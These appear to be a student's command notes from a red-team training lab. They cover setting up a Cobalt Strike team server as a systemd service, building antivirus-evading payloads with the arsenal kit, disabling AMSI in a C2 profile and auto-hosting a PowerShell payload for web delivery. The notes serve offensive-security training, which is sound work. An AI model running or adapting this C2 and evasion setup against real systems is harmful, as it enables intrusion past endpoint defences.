```
sudo vim /etc/systemd/system/teamserver.service
```

```
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
#ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'

[Install]
WantedBy=multi-user.target
```

```
sudo systemctl daemon-reload;sudo systemctl enable teamserver.service;sudo systemctl start teamserver.service;sudo systemctl status teamserver.service
```

# Create Listeners
[Red Team Ops - Zero-Point Security (zeropointsecurity.co.uk)](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/37750093-listener-management)



# AV Evasion

WSL
```bash
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
```

```shell
./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts
```

```shell
cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
```

```bash
./build.sh /mnt/c/Tools/cobaltstrike/resources
```

Open script manager in CS and load

/mnt/c/Tools/cobaltstrike/artifacts/pipe/artifact.cna

/mnt/c/Tools/cobaltstrike/resources/resources.cna

Generate All Payloads and test with

```Powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
```

``` Powershell
C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\http_x64.ps1 -e AMSI
```

WSL

```
vim c2-profiles/normal/webbug.profile
```

```
post-ex {
        set amsi_disable "true";
	    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
}
```

```
./c2lint c2-profiles/normal/webbug.profile
```

```
sudo systemctl restart teamserver.service;sudo systemctl status teamserver.service
```



mimi
[Red Team Ops - Zero-Point Security (zeropointsecurity.co.uk)](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/41815529-mimikatz-kit)

Create Dcom jumper
[Red Team Ops - Zero-Point Security (zeropointsecurity.co.uk)](https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/39198081-jump-remote-exec)


```
vim host_payloads.cna
```

```
# Connected and ready
on ready {

    # Generate payload
    $payload = artifact_payload("http", "powershell", "x64");

    # Host payload
    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
}
```

Uncomment

```
sudo vim /etc/systemd/system/teamserver.service
```

